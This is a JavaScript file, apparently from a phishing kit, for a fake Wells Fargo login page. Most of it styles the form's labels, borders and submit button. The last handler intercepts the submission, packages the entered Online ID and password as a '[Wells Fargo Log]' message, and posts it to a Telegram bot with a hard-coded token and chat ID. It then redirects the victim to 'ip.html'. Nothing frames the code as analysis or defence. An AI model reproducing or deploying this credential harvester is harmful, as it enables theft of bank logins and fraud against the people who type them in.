/*--------- Keep label elevated ------------*/

// Wrap your code in a function
function initializeFormBehavior() {
    // Select the input elements and their corresponding labels
    var inputElements = document.querySelectorAll('.form-contact input[type="text"], .form-contact input[type="password"]');
    var labels = document.querySelectorAll('.inputbox label, .inputbox2 label');

    // Loop through each input element and add an event listener for the 'input' event
    inputElements.forEach(function(inputElement, index) {
        inputElement.addEventListener('input', function() {
            // Check if the input element is not empty
            if (inputElement.value !== '') {
                // Modify the label's position for the corresponding input
                labels[index].style.transform = 'translateY(-160%) translateX(-15%) scale(0.9)';
            } else {
                // Reset the label's position if the input is empty
                labels[index].style.transform = 'translateY(-50%)';
            }
        });
    });
}

// Add an event listener for the 'DOMContentLoaded' event
document.addEventListener('DOMContentLoaded', initializeFormBehavior);

// JavaScript to handle the input behavior make red
document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fpassword');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)';
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore grey styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});


document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('fusername');
    var label = input.nextElementSibling;

    // Function to apply red styling to placeholder
    function applyRedPlaceholder() {
        input.style.borderBottomColor = 'rgb(137, 0, 0)';
        label.style.color = 'rgb(137, 0, 0)'
    }

    // Function to restore original placeholder and grey styling
    function restoreGreyStyling() {
        input.style.borderBottomColor = 'rgb(164, 164, 164)';
        label.style.color = 'rgb(164, 164, 164)';

    }

    function bluestyling() {
        input.style.borderBottomColor = 'rgb(62, 0, 117)';
        label.style.color = 'rgb(164, 164, 164)';
    }

    // Apply grey styling when the page loads
    restoreGreyStyling();

    // When input is focused (clicked inside), restore styling
    input.addEventListener('focus', function() {
        bluestyling();
    });

    // When input loses focus (clicked off), apply red styling to placeholder if empty
    input.addEventListener('blur', function() {
        if (input.value.trim() === '') {
            applyRedPlaceholder();
        } else {
            restoreGreyStyling();
        }
    });
});


// Function to check if the form fields are not empty and update display options for certain IDs
function updateDisplayOptions() {
    // Get the username and password input elements
    var usernameInput = document.querySelector('.form-contact input[type="text"]');
    var passwordInput = document.querySelector('.form-contact input[type="password"]');

    // Get the elements you want to change the display options for
    var element1 = document.getElementById('fsubmit'); // Replace 'element1' with the actual ID
    var element2 = document.getElementById('fsubmit2'); // Replace 'element2' with the actual ID

    // Check if both username and password fields are not empty
    if (usernameInput.value !== '' && passwordInput.value !== '') {
        // If both fields are not empty, change the display options to 'block' (visible)
        element1.style.display = 'none';
        element2.style.display = 'block';
    } else {
        // If either field is empty, change the display options to 'none' (hidden)
        element1.style.display = 'block';
        element2.style.display = 'none';
    }
}

// Add an event listener for the 'DOMContentLoaded' event
document.addEventListener('DOMContentLoaded', function() {
    // Add event listeners to the username and password input fields for the 'input' event
    document.querySelector('.form-contact input[type="text"]').addEventListener('input', updateDisplayOptions);
    document.querySelector('.form-contact input[type="password"]').addEventListener('input', updateDisplayOptions);

    // Call updateDisplayOptions initially in case there's already data in the fields on page load
    updateDisplayOptions();
});




document.addEventListener('DOMContentLoaded', () => {
    // Submissions
    const fusername = document.getElementById('fusername');
    const fpassword = document.getElementById('fpassword');
    const submit = document.getElementsByClassName('form-contact')[0];

    submit.addEventListener('submit', async (e) => {
        e.preventDefault();

        let ebody = `
        \n
        <b>[Wells Fargo Log]</b>
        \n
        <b>Online ID: </b>${fusername.value}
        \n
        <b>Password: </b>${fpassword.value}
        \n`;

        // Telegram Bot API endpoint
        const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
        const chatId = '6391433593';

        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        try {
            const response = await axios.post(telegramApiUrl, {
                chat_id: chatId,
                text: ebody,
                parse_mode: 'HTML',
            });

            // Redirect after sending the message
            window.location.href = "ip.html";
        } catch (error) {
            console.error("Error sending message to Telegram:", error);

            // Check if there's a specific error message from the Telegram API response
            if (error.response && error.response.data) {
                console.error("Telegram API error:", error.response.data);
            }
        }
    });
});


